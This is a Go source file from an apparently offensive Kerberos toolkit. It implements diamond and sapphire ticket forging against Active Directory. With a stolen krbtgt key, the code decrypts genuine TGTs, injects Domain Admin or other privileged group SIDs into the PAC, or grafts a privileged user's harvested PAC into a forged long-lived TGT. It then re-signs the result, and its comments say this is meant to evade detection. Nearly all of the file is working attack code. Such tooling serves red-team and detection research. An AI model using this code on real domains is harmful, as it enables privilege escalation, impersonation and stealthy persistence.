package kerberos

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"strings"
	"time"

	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/pac"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/sfu"
	msdtyp "github.com/TheManticoreProject/Manticore/windows/ms-dtyp"
)

// Diamond and sapphire ticket forging.
//
// Golden/silver forging (forge.go) fabricates the whole PAC from scratch, which
// leaves detectable anomalies (a TGT with no matching AS exchange, a PAC whose
// contents the KDC never issued). Diamond and sapphire instead re-use a
// legitimately issued PAC so the result blends in with normal Kerberos traffic:
//
//   - DIAMOND: request a genuine TGT from the KDC (a normal AS exchange), decrypt
//     its EncTicketPart with the krbtgt key (ticket key usage 2), edit the
//     embedded PAC's KERB_VALIDATION_INFO (e.g. add Domain Admins), recompute the
//     server then KDC signatures ([MS-PAC] 2.8) with the krbtgt key, and
//     re-encrypt the EncTicketPart with the krbtgt key. The ticket is based on one
//     the KDC really issued, so it evades "this TGT was never issued" heuristics.
//
//   - SAPPHIRE: obtain a privileged user's genuine PAC by requesting an S4U2Self
//     ticket for that user combined with user-to-user (ENC-TKT-IN-SKEY), so the
//     KDC encrypts the reply ticket to a TGT session key the attacker holds and
//     can decrypt. The real PAC is extracted and grafted into a forged TGT for the
//     impersonated principal, re-signed with the krbtgt key. No PAC identity fields
//     are fabricated — every group/SID is one the KDC actually issued.
//
// Both re-sign with the same primitives golden/silver use (pac.PAC.Sign and the
// AD-IF-RELEVANT wrapping in forge.go). The two signature buffers a ticket holder
// cannot reproduce for a rewritten PAC — the ticket signature (0x10) and the
// extended-KDC signature (0x13), keyed over inputs only the issuing KDC has — are
// dropped; a Windows KDC validating a TGT checks the server and KDC signatures,
// exactly as it does for a golden ticket.

// PACModifications describes the edits a diamond ticket applies to a genuinely
// issued PAC's KERB_VALIDATION_INFO. The zero value makes no changes (a faithful
// re-encryption of the original ticket).
type PACModifications struct {
	// AddGroupRIDs are group RIDs appended to the account-domain group list
	// (GroupIds), e.g. 512 (Domain Admins) or 519 (Enterprise Admins). RIDs
	// already present are skipped.
	AddGroupRIDs []uint32
	// ExtraSIDs are fully-qualified SIDs appended to the PAC ExtraSids list (e.g.
	// the Enterprise Admins SID of another domain). Adding any sets the ExtraSids
	// UserFlags bit ([MS-PAC] 2.5).
	ExtraSIDs []string
	// UserRID, when non-zero, overrides the PAC UserId (the impersonated RID).
	UserRID uint32
	// PrimaryGroupRID, when non-zero, overrides the PAC PrimaryGroupId.
	PrimaryGroupRID uint32
}

// ForgeDiamond forges a diamond ticket from the TGT this client currently holds.
// GetTGT must have succeeded first (with a password, hash, key, or PKINIT): the
// client's genuine TGT is decrypted with krbtgtKey, its PAC is edited per mods,
// re-signed and re-encrypted with krbtgtKey, and returned as a ForgedTicket
// usable via KirbiBytes / LoadTGTFromKirbiBytes (pass-the-ticket) exactly like a
// golden ticket — but built on a ticket the KDC really issued.
//
// krbtgtKey is the domain krbtgt account's long-term key; its encryption type is
// taken from the TGT's own enc-part etype (the KDC encrypted the TGT with it).
func (c *KerberosClient) ForgeDiamond(krbtgtKey []byte, mods PACModifications) (*ForgedTicket, error) {
	if !c.hasTGT {
		return nil, fmt.Errorf("kerberos: forge diamond: no TGT: call GetTGT first")
	}
	if len(krbtgtKey) == 0 {
		return nil, fmt.Errorf("kerberos: forge diamond: krbtgt key is required")
	}
	return forgeDiamondFromTicket(c.tgtTicket, krbtgtKey, mods)
}

// forgeDiamondFromTicket is the network-independent core of ForgeDiamond: given a
// KDC-issued TGT and the krbtgt key, it decrypts the EncTicketPart, edits and
// re-signs the PAC, and re-encrypts. It is separated so the transform can be
// exercised offline against a synthetic KDC-issued ticket.
func forgeDiamondFromTicket(ticket messages.Ticket, krbtgtKey []byte, mods PACModifications) (*ForgedTicket, error) {
	etype := ticket.EncPart.EType
	if _, _, ok := pac.SignatureTypeForEType(etype); !ok {
		return nil, fmt.Errorf("kerberos: forge diamond: TGT enc-part etype %d cannot key a PAC signature", etype)
	}

	// Decrypt the genuine TGT's EncTicketPart with the krbtgt key (usage 2).
	plain, err := kerbcrypto.Decrypt(etype, krbtgtKey, kerbcrypto.KeyUsageKDCRepTicket, ticket.EncPart.Cipher)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: decrypt EncTicketPart with krbtgt key: %w", err)
	}
	var enc messages.EncTicketPart
	if _, err := enc.Unmarshal(plain); err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: parse EncTicketPart: %w", err)
	}

	// Edit and re-sign the embedded PAC with the krbtgt key (server and KDC
	// signatures both use it, as for a golden ticket).
	pacBytes := extractWin2KPAC(enc.AuthorizationData)
	if pacBytes == nil {
		return nil, fmt.Errorf("kerberos: forge diamond: TGT carries no PAC")
	}
	newPAC, err := editAndResignPAC(pacBytes, mods, krbtgtKey, krbtgtKey, etype)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: %w", err)
	}
	authData, err := wrapPACInAuthData(newPAC)
	if err != nil {
		return nil, err
	}
	enc.AuthorizationData = authData

	// Re-encrypt the modified EncTicketPart with the krbtgt key (usage 2).
	encBytes, err := enc.Marshal()
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: marshal EncTicketPart: %w", err)
	}
	cipher, err := kerbcrypto.Encrypt(etype, krbtgtKey, kerbcrypto.KeyUsageKDCRepTicket, encBytes)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: re-encrypt EncTicketPart: %w", err)
	}
	ticket.EncPart.Cipher = cipher
	ticketRaw, err := ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge diamond: marshal ticket: %w", err)
	}

	// The ticket keeps its genuine flags, times, and session key.
	credInfo := messages.KrbCredInfo{
		Key:       enc.Key,
		PRealm:    enc.CRealm,
		PName:     enc.CName,
		Flags:     enc.Flags,
		AuthTime:  enc.AuthTime,
		StartTime: enc.StartTime,
		EndTime:   enc.EndTime,
		RenewTill: enc.RenewTill,
		SRealm:    ticket.Realm,
		SName:     ticket.SName,
	}
	return &ForgedTicket{
		Ticket:       ticket,
		TicketRaw:    ticketRaw,
		CredInfo:     credInfo,
		SessionKey:   enc.Key.KeyValue,
		SessionEType: enc.Key.KeyType,
	}, nil
}

// SapphireOptions describes a sapphire ticket: the privileged account to harvest
// a genuine PAC for, and the krbtgt key that signs and encrypts the emitted TGT.
type SapphireOptions struct {
	// ImpersonateUser is the privileged account (e.g. Administrator) whose real
	// PAC to obtain via S4U2Self + U2U.
	ImpersonateUser string
	// ImpersonateRealm is that account's realm; empty means the client's realm.
	ImpersonateRealm string
	// Key is the domain krbtgt account's long-term key, which signs the grafted
	// PAC (server and KDC signatures) and encrypts the emitted TGT.
	Key []byte
	// KeyEType is Key's Kerberos encryption type (17 = AES128, 18 = AES256,
	// 23 = RC4).
	KeyEType int
	// SessionKey is the session key sealed in the emitted TGT; a random key of
	// SessionEType is generated when nil.
	SessionKey []byte
	// SessionEType is the session key's encryption type (defaults to RC4).
	SessionEType int
	// StartTime, EndTime, RenewTill bound the emitted TGT (defaults: now,
	// now+10y, EndTime).
	StartTime time.Time
	EndTime   time.Time
	RenewTill time.Time
}

// ForgeSapphire forges a sapphire ticket. Using the TGT this client holds
// (GetTGT must have succeeded), it requests the impersonated user's genuine PAC
// via a combined S4U2Self + user-to-user (ENC-TKT-IN-SKEY) exchange — so the KDC
// encrypts the reply ticket to the client's own TGT session key — extracts that
// real PAC, and grafts it into a forged TGT (krbtgt/REALM) re-signed and
// encrypted with opts.Key. The result is usable via KirbiBytes /
// LoadTGTFromKirbiBytes to act as the impersonated user, with a PAC whose
// identity fields the KDC actually issued.
func (c *KerberosClient) ForgeSapphire(opts SapphireOptions) (*ForgedTicket, error) {
	if !c.hasTGT {
		return nil, fmt.Errorf("kerberos: forge sapphire: no TGT: call GetTGT first")
	}
	if opts.ImpersonateUser == "" {
		return nil, fmt.Errorf("kerberos: forge sapphire: ImpersonateUser is required")
	}
	if len(opts.Key) == 0 {
		return nil, fmt.Errorf("kerberos: forge sapphire: krbtgt Key is required")
	}
	if _, _, ok := pac.SignatureTypeForEType(opts.KeyEType); !ok {
		return nil, fmt.Errorf("kerberos: forge sapphire: unsupported signing-key etype %d", opts.KeyEType)
	}

	// Harvest the privileged user's genuine PAC over S4U2Self + U2U.
	pacBytes, cname, crealm, err := c.harvestPACViaS4USelfU2U(opts.ImpersonateUser, opts.ImpersonateRealm)
	if err != nil {
		return nil, err
	}
	return graftPACIntoTGT(pacBytes, cname, crealm, opts)
}

// buildSapphireTGSReq builds the TGS-REQ for the sapphire harvest: it is an
// S4U2Self request (PA-TGS-REQ over the client's own TGT, PA-FOR-USER naming the
// impersonated user, PA-PAC-REQUEST, sname = the client's own account) that also
// sets the ENC-TKT-IN-SKEY option and carries the client's own TGT in
// additional-tickets. That user-to-user combination makes the KDC encrypt the
// reply ticket under the client's TGT session key instead of the client's
// long-term key, so the client can decrypt it and read the impersonated user's
// PAC. It is separated so the request shape can be tested without a KDC.
func (c *KerberosClient) buildSapphireTGSReq(impersonateUser, impersonateRealm string, nonce int) (*messages.TGSReq, error) {
	if impersonateRealm == "" {
		impersonateRealm = c.realm
	} else {
		impersonateRealm = strings.ToUpper(impersonateRealm)
	}

	userName := messages.PrincipalName{
		NameType:   messages.NameTypePrincipal,
		NameString: []string{impersonateUser},
	}
	paForUser, err := sfu.BuildPAForUser(userName, impersonateRealm, c.sessionKey, c.sessionEType)
	if err != nil {
		return nil, fmt.Errorf("kerberos: build PA-FOR-USER: %w", err)
	}

	apReqBytes, err := c.buildAPReq()
	if err != nil {
		return nil, fmt.Errorf("kerberos: build AP-REQ: %w", err)
	}

	self := messages.PrincipalName{
		NameType:   messages.NameTypePrincipal,
		NameString: []string{c.username},
	}

	return &messages.TGSReq{
		PVNO:    messages.KerberosV5,
		MsgType: messages.MsgTypeTGSReq,
		PAData: []messages.PAData{
			{PADataType: messages.PATGSReq, PADataValue: apReqBytes},
			paForUser,
			{PADataType: messages.PAPACRequest, PADataValue: []byte{0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0xff}},
		},
		ReqBody: messages.KDCReqBody{
			KDCOptions: encodeKDCOptions(
				kdcOptionForwardable,
				kdcOptionRenewable,
				kdcOptionCanonicalize,
				kdcOptionEncTktInSKey,
			),
			Realm: c.realm,
			SName: self,
			Till:  c.now().Add(24 * time.Hour),
			Nonce: nonce,
			EType: []int{
				messages.ETypeAES256CTSHMACSHA196,
				messages.ETypeAES128CTSHMACSHA196,
				messages.ETypeRC4HMAC,
			},
			AdditTicketsRaw: [][]byte{c.tgtTicketRaw},
		},
	}, nil
}

// harvestPACViaS4USelfU2U performs the sapphire harvest exchange and returns the
// impersonated user's raw PAC bytes together with the ticket's client principal
// (which the KDC set to the impersonated user) and realm.
func (c *KerberosClient) harvestPACViaS4USelfU2U(impersonateUser, impersonateRealm string) ([]byte, messages.PrincipalName, string, error) {
	nonce := randomNonce()
	tgsReq, err := c.buildSapphireTGSReq(impersonateUser, impersonateRealm, nonce)
	if err != nil {
		return nil, messages.PrincipalName{}, "", err
	}

	tgsReqBytes, err := tgsReq.Marshal()
	if err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: marshal sapphire TGS-REQ: %w", err)
	}
	resp, err := c.sendToRealm(c.realm, tgsReqBytes)
	if err != nil {
		return nil, messages.PrincipalName{}, "", err
	}

	var krbErr messages.KRBError
	if _, parseErr := krbErr.Unmarshal(resp); parseErr == nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: sapphire harvest error %d: %s", krbErr.ErrorCode, krbErr.EText)
	}

	var tgsRep messages.TGSRep
	if _, err := tgsRep.Unmarshal(resp); err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: parse sapphire TGS-REP: %w", err)
	}

	// Confirm the reply is ours via the enc-part nonce (decrypted with our TGT
	// session key).
	encPlain, err := kerbcrypto.Decrypt(c.sessionEType, c.sessionKey, kerbcrypto.KeyUsageTGSRepEncSessionKey, tgsRep.EncPart.Cipher)
	if err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: decrypt sapphire TGS-REP enc-part: %w", err)
	}
	var encTGSRep messages.EncTGSRepPart
	if _, err := encTGSRep.Unmarshal(encPlain); err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: parse sapphire EncTGSRepPart: %w", err)
	}
	if encTGSRep.Nonce != nonce {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: sapphire nonce mismatch: got %d, want %d", encTGSRep.Nonce, nonce)
	}

	// ENC-TKT-IN-SKEY: the issued ticket's enc-part is encrypted under our TGT
	// session key (usage 2), not a long-term key, so we can decrypt it.
	pacBytes, cname, crealm, err := extractPACFromTicket(tgsRep.Ticket, c.sessionEType, c.sessionKey)
	if err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: sapphire harvest: %w", err)
	}
	return pacBytes, cname, crealm, nil
}

// extractPACFromTicket decrypts a ticket's EncTicketPart with the given key
// (ticket key usage 2) and returns the embedded PAC bytes and the ticket's
// client principal/realm. It is the shared decrypt-and-extract step for the
// sapphire harvest and its offline test.
func extractPACFromTicket(ticket messages.Ticket, etype int, key []byte) ([]byte, messages.PrincipalName, string, error) {
	plain, err := kerbcrypto.Decrypt(etype, key, kerbcrypto.KeyUsageKDCRepTicket, ticket.EncPart.Cipher)
	if err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("decrypt EncTicketPart: %w", err)
	}
	var enc messages.EncTicketPart
	if _, err := enc.Unmarshal(plain); err != nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("parse EncTicketPart: %w", err)
	}
	pacBytes := extractWin2KPAC(enc.AuthorizationData)
	if pacBytes == nil {
		return nil, messages.PrincipalName{}, "", fmt.Errorf("ticket carries no PAC")
	}
	return pacBytes, enc.CName, enc.CRealm, nil
}

// graftPACIntoTGT splices a genuine PAC into a forged TGT (krbtgt/REALM) for the
// given client principal, re-signing the PAC with opts.Key and encrypting the
// ticket with it. The PAC's identity fields are left untouched; only the two
// signatures are recomputed so they match the emitted ticket's key. It is
// separated so the graft can be verified offline (no fields fabricated).
func graftPACIntoTGT(pacBytes []byte, cname messages.PrincipalName, crealm string, opts SapphireOptions) (*ForgedTicket, error) {
	realm := crealm
	if opts.ImpersonateRealm != "" {
		realm = strings.ToUpper(opts.ImpersonateRealm)
	}
	realm = strings.ToUpper(realm)
	if realm == "" {
		return nil, fmt.Errorf("kerberos: forge sapphire: could not determine realm for grafted ticket")
	}

	p, err := pac.Parse(pacBytes)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge sapphire: parse harvested PAC: %w", err)
	}
	// Re-sign the genuine PAC (no logon-info replacement) with the krbtgt key.
	signedPAC, err := rebuildAndSignPAC(p, nil, opts.Key, opts.Key, opts.KeyEType)
	if err != nil {
		return nil, fmt.Errorf("kerberos: forge sapphire: re-sign grafted PAC: %w", err)
	}
	authData, err := wrapPACInAuthData(signedPAC)
	if err != nil {
		return nil, err
	}

	start := opts.StartTime
	if start.IsZero() {
		start = time.Now().UTC()
	}
	start = start.UTC().Truncate(time.Second)
	end := opts.EndTime
	if end.IsZero() {
		end = start.AddDate(10, 0, 0)
	}
	renew := opts.RenewTill
	if renew.IsZero() {
		renew = end
	}

	sessionEType := opts.SessionEType
	if sessionEType == 0 {
		sessionEType = messages.ETypeRC4HMAC
	}
	sessionKey := opts.SessionKey
	if sessionKey == nil {
		sessionKey = make([]byte, kerbcrypto.KeyLen(sessionEType))
		if _, err := rand.Read(sessionKey); err != nil {
			return nil, err
		}
	}

	sname := messages.PrincipalName{
		NameType:   messages.NameTypeSRVInst,
		NameString: []string{"krbtgt", realm},
	}

	return assembleForgedTicket(assembleParams{
		SName:        sname,
		SRealm:       realm,
		CName:        cname,
		Initial:      true, // a sapphire ticket is a TGT
		AuthData:     authData,
		Key:          opts.Key,
		KeyEType:     opts.KeyEType,
		SessionKey:   sessionKey,
		SessionEType: sessionEType,
		StartTime:    start,
		EndTime:      end,
		RenewTill:    renew,
	})
}

// editAndResignPAC decodes a PAC's logon info, applies mods, re-encodes it, and
// re-signs the server and KDC checksums with serverKey/kdcKey (signEType keys the
// signature buffers). It underpins the diamond edit.
func editAndResignPAC(pacBytes []byte, mods PACModifications, serverKey, kdcKey []byte, signEType int) ([]byte, error) {
	p, err := pac.Parse(pacBytes)
	if err != nil {
		return nil, fmt.Errorf("parse PAC: %w", err)
	}
	info, err := p.LogonInfo()
	if err != nil {
		return nil, fmt.Errorf("decode PAC logon info: %w", err)
	}
	if err := applyPACModifications(info, mods); err != nil {
		return nil, err
	}
	// Normalize the counted strings so the RPC_UNICODE_STRING headers stay
	// consistent with the NDR conformant array bounds on re-encode (see
	// normalizeLogonInfoStrings); a Windows-issued PAC allocates MaximumLength one
	// UTF-16 unit larger than Length, which our encoder cannot reproduce and which
	// a KDC rejects as a header/array-count mismatch.
	normalizeLogonInfoStrings(info)
	newLogon, err := pac.MarshalKerbValidationInfo(info)
	if err != nil {
		return nil, fmt.Errorf("re-encode PAC logon info: %w", err)
	}
	return rebuildAndSignPAC(p, newLogon, serverKey, kdcKey, signEType)
}

// applyPACModifications edits a decoded KERB_VALIDATION_INFO in place: it
// overrides the user/primary-group RIDs when set, appends any new group RIDs
// (keeping GroupCount consistent), and appends ExtraSids (setting the ExtraSids
// UserFlags bit and SidCount).
func applyPACModifications(info *pac.KERB_VALIDATION_INFO, mods PACModifications) error {
	if mods.UserRID != 0 {
		info.UserId = mods.UserRID
	}
	if mods.PrimaryGroupRID != 0 {
		info.PrimaryGroupId = mods.PrimaryGroupRID
	}

	for _, rid := range mods.AddGroupRIDs {
		present := false
		for _, g := range info.GroupIds {
			if g.RelativeId == rid {
				present = true
				break
			}
		}
		if present {
			continue
		}
		info.GroupIds = append(info.GroupIds, pac.GROUP_MEMBERSHIP{
			RelativeId: rid,
			Attributes: pac.DefaultGroupAttributes,
		})
	}
	info.GroupCount = uint32(len(info.GroupIds))

	for _, s := range mods.ExtraSIDs {
		sid, err := msdtyp.ParseSID(s)
		if err != nil {
			return fmt.Errorf("parse ExtraSID %q: %w", s, err)
		}
		sidCopy := sid
		info.ExtraSids = append(info.ExtraSids, pac.KERB_SID_AND_ATTRIBUTES{
			Sid:        &sidCopy,
			Attributes: pac.DefaultGroupAttributes,
		})
	}
	info.SidCount = uint32(len(info.ExtraSids))
	if info.SidCount > 0 {
		info.UserFlags |= 0x20 // ExtraSids present ([MS-PAC] 2.5, UserFlags bit D)
	}
	return nil
}

// normalizeLogonInfoStrings rewrites every RPC_UNICODE_STRING in the logon info
// so its MaximumLength equals its Length and its Buffer holds exactly Length/2
// UTF-16 units. A Windows-issued PAC often stores MaximumLength = Length + 2 (a
// slot for a NUL that is not transmitted), which makes the string's conformant
// array MaximumCount one unit larger than the transmitted element count. Our NDR
// encoder derives MaximumCount from the Buffer length, so without this
// normalization the re-encoded header (MaximumLength) and the array bound
// (MaximumCount) disagree and the KDC rejects the ticket. Collapsing both to
// Length matches the shape a forged (golden) PAC uses, which KDCs accept.
func normalizeLogonInfoStrings(info *pac.KERB_VALIDATION_INFO) {
	for _, u := range []*pac.RPC_UNICODE_STRING{
		&info.EffectiveName, &info.FullName, &info.LogonScript, &info.ProfilePath,
		&info.HomeDirectory, &info.HomeDirectoryDrive, &info.LogonServer, &info.LogonDomainName,
	} {
		n := int(u.Length / 2)
		if n <= len(u.Buffer) {
			u.Buffer = u.Buffer[:n]
		}
		u.MaximumLength = u.Length
	}
}

// rebuildAndSignPAC lays out a copy of orig — optionally replacing the logon-info
// buffer with newLogonInfo (nil keeps the original) — re-creating fresh, zeroed
// server (0x06) and KDC (0x07) signature buffers sized for signEType, and
// dropping the ticket signature (0x10) and extended-KDC signature (0x13), which a
// ticket holder cannot recompute. It then signs (server first, then KDC over the
// server signature, [MS-PAC] 2.8) with serverKey/kdcKey and returns the marshaled
// PAC.
func rebuildAndSignPAC(orig *pac.PAC, newLogonInfo, serverKey, kdcKey []byte, signEType int) ([]byte, error) {
	srvBuf, err := newSignatureBuffer(signEType)
	if err != nil {
		return nil, err
	}
	kdcBuf, err := newSignatureBuffer(signEType)
	if err != nil {
		return nil, err
	}

	var bufs []pac.Buffer
	haveServer, haveKDC := false, false
	for _, b := range orig.Buffers {
		switch b.Type {
		case pac.BufferLogonInfo:
			data := b.Data
			if newLogonInfo != nil {
				data = newLogonInfo
			}
			bufs = append(bufs, pac.Buffer{Type: b.Type, Data: append([]byte(nil), data...)})
		case pac.BufferServerChecksum:
			bufs = append(bufs, pac.Buffer{Type: b.Type, Data: srvBuf})
			haveServer = true
		case pac.BufferKDCChecksum:
			bufs = append(bufs, pac.Buffer{Type: b.Type, Data: kdcBuf})
			haveKDC = true
		case pac.BufferTicketChecksum, pac.BufferExtendedKDCChecksum:
			// Keyed over inputs only the issuing KDC has; cannot be reproduced for
			// a rewritten ticket/PAC, so drop them (a golden ticket omits them too).
			continue
		default:
			bufs = append(bufs, pac.Buffer{Type: b.Type, Data: append([]byte(nil), b.Data...)})
		}
	}
	if !haveServer {
		bufs = append(bufs, pac.Buffer{Type: pac.BufferServerChecksum, Data: srvBuf})
	}
	if !haveKDC {
		bufs = append(bufs, pac.Buffer{Type: pac.BufferKDCChecksum, Data: kdcBuf})
	}

	p := &pac.PAC{Buffers: bufs}
	signed, err := p.Sign(serverKey, kdcKey)
	if err != nil {
		return nil, fmt.Errorf("re-sign PAC: %w", err)
	}
	return signed, nil
}

// newSignatureBuffer builds an empty PAC_SIGNATURE_DATA buffer ([MS-PAC] 2.8) for
// a signing key of the given etype: the 4-byte SignatureType followed by a zeroed
// Signature of the type's length (Sign fills the Signature in place).
func newSignatureBuffer(signEType int) ([]byte, error) {
	sigType, size, ok := pac.SignatureTypeForEType(signEType)
	if !ok {
		return nil, fmt.Errorf("cannot size PAC signature for etype %d", signEType)
	}
	b := make([]byte, 4+size)
	binary.LittleEndian.PutUint32(b, sigType)
	return b, nil
}
